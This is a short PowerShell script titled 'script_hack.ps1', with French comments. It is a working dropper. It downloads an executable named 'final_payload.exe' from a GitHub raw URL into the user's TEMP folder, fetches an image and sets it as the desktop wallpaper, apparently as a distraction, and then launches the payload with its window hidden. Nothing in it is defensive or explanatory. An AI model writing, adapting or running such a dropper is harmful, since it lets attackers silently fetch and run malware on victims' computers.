# script_hack.ps1
try {
    # Méthode alternative avec gestion d'erreur
    $webClient = New-Object System.Net.WebClient
    
    # Télécharger le payload
    $payloadUrl = "https://raw.githubusercontent.com/FogBound-IT/test/main/final_payload.exe"
    $payloadPath = "$env:TEMP\payload.exe"
    
    Write-Host "Téléchargement du payload..."
    $webClient.DownloadFile($payloadUrl, $payloadPath)
    
    # Télécharger l'image
    $imageUrl = "https://raw.githubusercontent.com/FogBound-IT/test/main/thumb-1920-423529.jpg" 
    $imagePath = "$env:TEMP\wallpaper.jpg"
    
    Write-Host "Téléchargement de l'image..."
    $webClient.DownloadFile($imageUrl, $imagePath)
    
    # Changer le fond d'écran
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class Wallpaper {
        [DllImport("user32.dll", CharSet=CharSet.Auto)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    }
"@
    [Wallpaper]::SystemParametersInfo(20, 0, $imagePath, 3)
    
    # Lancer le payload
    Start-Process $payloadPath -WindowStyle Hidden
    Write-Host "Script exécuté avec succès"
    
} catch {
    Write-Host "Erreur détaillée: $($_.Exception.ToString())"
}
